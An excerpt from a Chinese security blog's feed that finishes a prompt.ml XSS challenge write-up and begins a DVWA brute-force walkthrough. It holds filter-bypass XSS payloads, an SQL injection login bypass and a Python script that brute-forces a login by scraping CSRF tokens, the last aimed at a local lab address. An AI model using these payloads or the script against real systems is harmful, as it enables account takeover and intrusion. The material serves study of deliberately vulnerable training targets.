“$”。</td></tr><tr><td>$&amp;</td><td>插入匹配的子串。</td></tr><tr><td>$`</td><td>插入当前匹配的子串左边的内容。</td></tr><tr><td>$’</td><td>插入当前匹配的子串右边的内容。</td></tr><tr><td>$n</td><td>假如第一个参数是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/RegExp"><code>RegExp</code></a>对象，并且 n 是个小于100的非负整数，那么插入第 n 个括号匹配的字符串。提示：索引是从1开始</td></tr></tbody></table><p>参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace</a></p><p>不妨做个实验：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;aaabbbccc&quot;</span>.replace(<span class="string">&#x27;b&#x27;</span>,<span class="string">&quot;$&amp;V&quot;</span>)</span><br><span class="line"><span class="string">&quot;aaabVbbccc&quot;</span><span class="comment">// aaab + V（插入内容） +bbccc</span></span><br><span class="line"><span class="string">&quot;aaabbbccc&quot;</span>.replace(<span class="string">&#x27;b&#x27;</span>,<span class="string">&quot;$`V&quot;</span>)</span><br><span class="line"><span class="string">&quot;aaaaaaVbbccc&quot;</span><span class="comment">// aaa + aaaV(插入内容) + bbccc</span></span><br><span class="line"><span class="string">&quot;aaabbbccc&quot;</span>.replace(<span class="string">&#x27;b&#x27;</span>,<span class="string">&quot;$&#x27;V&quot;</span>)</span><br><span class="line"><span class="string">&quot;aaabbcccVbbccc&quot;</span><span class="comment">// aaabbccc + Vbbccc(插入内容)</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;source&quot;:&quot;#&#39;&quot;,&quot;__proto__&quot;: &#123;&quot;source&quot;:&quot;$&#96;onerror&#x3D;prompt(1)&gt;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>最终拼接的一个js代码就变成了：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&lt;img src&#x3D;&quot;onerror&#x3D;prompt(1)&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>说实话，我被这道题的作者知识量和逻辑设计惊艳到了。。。</p><h2 id="第14关"><a href="#第14关" class="headerlink" title="第14关"></a>第14关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></span><br><span class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></span><br><span class="line">    <span class="comment">// too lazy to convert them back in lower case</span></span><br><span class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\/\/|\w+:/g</span>, <span class="string">&#x27;data:&#x27;</span>);</span><br><span class="line">    <span class="comment">// miscellaneous filtering</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><p>函数先把输入转换为大写，第二层将<code>//</code>和字母换为<code>data:</code>，第三层将<code>\\</code>、<code>&amp;</code>、<code>+</code>、<code>%</code>和空白字符，<code>vbs</code>替换为<code>_</code>，所以不能内嵌编码后的字符，由于js大小写敏感，所以只能引用外部脚本。Data URI是由RFC 2397定义的一种把小文件直接嵌入文档的方案。格式如下:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:[&lt;MIME type&gt;][;charset&#x3D;&lt;charset&gt;][;base64],&lt;encoded data&gt;1</span><br></pre></td></tr></table></figure><p>其实整体可以视为三部分，即<code>声明：参数+数据</code>，逗号左边的是各种参数，右边的是数据。<br>MIME type，表示数据呈现的格式，即指定嵌入数据的MIME。</p><p>1、对于PNG的图片，其格式是<strong>image/png</strong>，如果没有指定，默认是<strong>text/plain</strong>。<br>2、<strong>character set(字符集）</strong>大多数被忽略，默认是<strong>charset=US-ASCII</strong>。如果指定是的数据格式是图片时，字符集将不再使用。<br>3、<strong>base64</strong>，这一部分将表明其数据的编码方式，此处为声明后面的数据的编码是<strong>base64</strong>，我们可以不必使用base64编码格式，如果那样，我们将使用标准的URL编码方式,形如%XX%XX%XX的格式。</p><p>注意Base64是只能是大写字母和数字,否则会因为过滤规则出现乱码。</p><p><strong>payload:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;IFRAME&#x2F;SRC&#x3D;&quot;x:text&#x2F;html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4&#x3D;</span><br></pre></td></tr></table></figure><p>原理差不多应该是这样，比较好理解，但是笔者实际操作未成功。</p><h2 id="第15关"><a href="#第15关" class="headerlink" title="第15关"></a>第15关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// sort of spoiler of level 7</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\*/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title, index</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 15 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;p class=&quot;comment&quot; title=&quot;&#x27;</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">&#x27;&quot; data-comment=\&#x27;&#123;&quot;id&quot;:&#x27;</span> + index + <span class="string">&#x27;&#125;\&#x27;&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;).join(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>本题跟之前利用#和换行符绕过的思路类似，只不过本题需要再多加个svg以及用<code>&lt;!- -</code> 和 <code>--&gt;</code>进行注释</p><p>Payload:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt&lt;!--#--&gt;(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>注释之后的HTML代码变成这样：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;comment&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--&quot; data-comment=&#x27;&#123;&quot;id&quot;:0&#125;&#x27;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">&lt;p class=&quot;comment&quot; title=&quot;--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&lt;!--<span class="string">&quot; data-comment=&#x27;&#123;&quot;</span>id<span class="string">&quot;:1&#125;&#x27;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;comment&quot;</span> title=<span class="string">&quot;--&gt;prompt&lt;!--&quot;</span> data-comment=<span class="string">&#x27;&#123;&quot;id&quot;:2&#125;&#x27;</span>&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;comment&quot;</span> title=<span class="string">&quot;--&gt;(1)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot; data-comment=&#x27;&#123;&quot;id&quot;:3&#125;&#x27;&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看到还有大佬利用<strong>模板字符串</strong>的方法，其实之前也有提到过：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;&#96;#$&#123;prompt(1)&#125;#&#96;&lt;&#x2F;script&gt;  </span><br></pre></td></tr></table></figure><p>也就是说<code>abc$&#123;prompt(1)&#125;abc</code>是可以正常执行的。</p><h2 id="第-1关（隐藏关）"><a href="#第-1关（隐藏关）" class="headerlink" title="第-1关（隐藏关）"></a>第-1关（隐藏关）</h2><p>然后会有几个隐藏关卡，也挺有意思的：）但是因为这些技巧和方法很多是过时的，在最新版的谷歌浏览器中已经无法复现，或许在较早版本可以复现。这里我只学习一下思路和技巧。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// WORLD -1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// strip off certain characters from breaking conditional statement</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[&#125;&lt;]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;                                                     \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                         \n\</span></span><br><span class="line"><span class="string">    if (history.length &gt; 1337) &#123;                                 \n\</span></span><br><span class="line"><span class="string">        // you can inject any code here                          \n\</span></span><br><span class="line"><span class="string">        // as long as it will be executed                        \n\</span></span><br><span class="line"><span class="string">        &#123;&#123;injection&#125;&#125;                                            \n\</span></span><br><span class="line"><span class="string">    &#125;                                                            \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                        \n\</span></span><br><span class="line"><span class="string">    &#x27;</span>.replace(<span class="string">&#x27;&#123;&#123;injection&#125;&#125;&#x27;</span>, input);</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure><p>过滤了<code>[&#125;&lt;]</code>，判断长度必须大于1337，所以用到<a href="https://www.cnblogs.com/liuhe688/p/5891273.html">js变量提升</a>，还用到了一个前面提到的关于replace的匹配技巧。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">history</span>(<span class="paramsspan>)<span class="title">$</span>&amp;<span class="title">prompt</span>(<span class="params"><span class="number">1</span></span>)</span></span><br></pre></td></tr></table></figure><h2 id="2关"><a href="#2关" class="headerlink" title="-2关"></a>-2关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Christmas special edition!</span></span><br><span class="line">    <span class="comment">// Ho ho ho these characters are in Santa&#x27;s naughty list</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[!=*`]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="comment">// pass in your wishes like pets#toys#half-life3...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title, index</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Don&#x27;t be greedy! Each present can only contain 20 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;p class=&quot;present&quot; title=&quot;&#x27;</span> + title.slice(<span class="number">0</span>, <span class="number">20</span>) + <span class="string">&#x27;&quot;&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;).join(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;     </span><br></pre></td></tr></table></figure><p>和之前也差不多，但是现在过滤了<code>!</code>,<code>*</code>,可能就没法用注释了，但是我们可以用一些条件来绕过：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;@if(0)#@end;prompt(1)@if(0)#@end&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://docs.microsoft.com/en-us/scripting/javascript/reference/at-cc-on-statement-javascript">https://docs.microsoft.com/en-us/scripting/javascript/reference/at-cc-on-statement-javascript</a><br><a href="https://docs.microsoft.com/en-us/scripting/javascript/reference/at-if-statement-javascript">https://docs.microsoft.com/en-us/scripting/javascript/reference/at-if-statement-javascript</a></p></blockquote><p>正如之前所说这两个连接所介绍的有些过时，在大部分较新浏览器上难以复现。</p><h2 id="3关"><a href="#3关" class="headerlink" title="-3关"></a>-3关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// I iz fabulous cat</span></span><br><span class="line">    <span class="comment">// cat hatez dem charz</span></span><br><span class="line">    <span class="keyword">var</span> query = input.replace(<span class="regexp">/[&amp;#&gt;]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">    <span class="comment">// find me on Twttr</span></span><br><span class="line">    script.src = <span class="string">&#x27;https://cdn.syndication.twitter.com/widgets/tweetbutton/count.json?url=&#x27;</span> + query + <span class="string">&#x27;&amp;callback=swag&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;input name=&quot;query&quot; type=&quot;hidden&quot; value=&quot;&#x27;</span> + query + <span class="string">&#x27;&quot;&gt;&#x27;</span> +</span><br><span class="line">        script.outerHTML;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>过滤了<code>&amp;#&gt;</code>。</p><p>使用过滤脚本和实际的API之间的“误会”.该脚本试图压制使用字符，允许突破或更改API参数。可以通过使用<code>;</code>代替<code>＆</code>。然后，只需要注入一个点击处理程序，该处理程序将侦听并等待API来实际触发该事件，从而执行。</p><p>非常有意思的技巧！！</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;onclick&#x3D;prompt(1) id&#x3D;&quot;a&quot;;callback&#x3D;a.click;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span><span class="attr">onclick</span>=<span class="string">prompt(1)</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>;<span class="attr">callback</span>=<span class="string">a.click;</span>&quot;&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.syndication.twitter.com/widgets/tweetbutton/count.json?url=<span class="symbol">&amp;quot;</span>onclick=prompt(1) id=<span class="symbol">&amp;quot;</span>a<span class="symbol">&amp;quot;</span>;callback=a.click;<span class="symbol">&amp;amp;</span>callback=swag&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可惜的是，链接现在也失效了。</p><h1 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h1><ul><li><a href="http://prompt.ml/">http://prompt.ml/</a></li><li><a href="https://xz.aliyun.com/t/4507">https://xz.aliyun.com/t/4507</a></li><li><a href="https://blog.csdn.net/Ni9htMar3/article/details/77938899">https://blog.csdn.net/Ni9htMar3/article/details/77938899</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;靶场：&lt;a href=&quot;http://prompt.ml/&quot;&gt;http://prompt.ml/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;整体看来还是比较简单</summary>
      
    
    
    
    <category term="Web安全" scheme="http://v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="XSS" scheme="http://v0w.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>DVWA全级别漏洞复现</title>
    <link href="http://v0w.top/2020/01/05/DVWA-all_in_one/"/>
    <id>http://v0w.top/2020/01/05/DVWA-all_in_one/</id>
    <published>2020-01-04T16:00:00.000Z</published>
    <updated>2020-07-18T10:36:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考研大半年没碰安全方面，考完研，想重新拾起网络安全方面的知识，想起来重新复现一遍DVWA，新的一年，希望能温故知新。另一方面，新版的<code>dvwa1.9</code>新增了几个新模块，博主之前未分析过，也学习一下分享一下。</p><h1 id="BruteForce（暴力破解）"><a href="#BruteForce（暴力破解）" class="headerlink" title="BruteForce（暴力破解）"></a>BruteForce（暴力破解）</h1><p>很熟悉了，直接看代码吧。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get username</span></span><br><span class="line">$user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get password</span></span><br><span class="line">$pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check the database</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line"><span class="comment">// Get users details</span></span><br><span class="line">$row    = mysqli_fetch_assoc( $result );</span><br><span class="line">$avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Login successful</span></span><br><span class="line">$html .= <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">$html .= <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Login failed</span></span><br><span class="line">$html .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到第3行，只验证了参数Login知否设置，没有防爆破方法，参数username和password都是没有任何过滤，直接拼接的，还存在明显的SQL注入漏洞。</p><p><strong>漏洞利用</strong></p><p><strong>方法 1 暴力破解</strong></p><p><img src="https://i.loli.net/2020/02/27/9O5TMPLaI7dnjou.png"></p><p><strong>方法2 SQl注入</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin &#39;# &amp;password&#x3D;1</span><br></pre></td></tr></table></figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>与<code>Low</code>的区别就在于这，增加了<code>$user</code>和<code>pass</code>的过滤，<code>mysql_real_escape_string</code>对特殊符号转义，加上对象判断，基本上能防御sql注入。但是并没有增防止加爆破的机制。依然可以通过爆破来爆破出密码，同上不做赘述。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>增加了<code>user_token</code>用于防御CSRF，登陆时需要验证4个参数：<code>username</code>,<code>password</code>,<code>Login</code>,<code>user_token</code>.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">   checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Sanitise username input</span></span><br><span class="line">   $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">   $user = stripslashes( $user );</span><br><span class="line">   $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Sanitise password input</span></span><br><span class="line">   $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">   $pass = stripslashes( $pass );</span><br><span class="line">   $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">   $pass = md5( $pass );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>每次服务器返回的登陆页面中都会包含一个随机的<code>user_token</code>的值，用户每次登录时都要将<code>user_token</code>一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。token不一致时，会返回</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CSRF token is incorrect</span><br></pre></td></tr></table></figure><p>这个增加了无脑爆破的难度，但是因为生成的<code>user_token</code>是可以在放在前端代码，可以写脚本来爆破，但是直接burpsuite无脑爆肯定是不行的了。</p><p><strong>漏洞利用</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># BruteForce </span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.220.1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;security=high; PHPSESSID=igtb1sfu1lm1gb9e4ug06i0d1e&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&#x27;http://192.168.220.1/dvwa/vulnerabilities/brute/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>(<span class="params">url, headers</span>):</span></span><br><span class="line">    req = requests.get(url=url, headers=headers)</span><br><span class="line">    response = req.text</span><br><span class="line">    <span class="comment"># print(response)</span></span><br><span class="line">    soup = BeautifulSoup(response, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    user_token = soup.form.find_all(<span class="string">&#x27;input&#x27;</span>)[<span class="number">3</span>][<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> user_token</span><br><span class="line"></span><br><span class="line">user_token = get_token(url,headers)</span><br><span class="line">dic = open(<span class="string">&#x27;3389.txt&#x27;</span>)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="comment"># print(line.strip())</span></span><br><span class="line">    requrl = <span class="string">&quot;http://192.168.220.1/dvwa/vulnerabilities/brute/index.php?username=admin&amp;password=&#123;&#125;&amp;Login=Login&amp;user_token=&#123;&#125;&quot;</span>.format(line.strip(), user_token)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    req = requests.get(requrl, headers)</span><br><span class="line">    print(i,<span class="string">&#x27;admin&#x27;</span>,line.strip(), user_token, req.status_code, len(req.text))</span><br><span class="line">    response = req.text</span><br><span class="line">    soup = BeautifulSoup(response, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    user_token = soup.form.find_all(<span class="string">&#x27;input&#x27;</span>)[<span class="number">3</span>][<span class="string">&#x27;value&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Login&#x27;</span> ] ) &amp;&amp; <span class="keyword">isset</span> ($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> ($_POST[<span class="string">&#x27;password&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_POST[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span 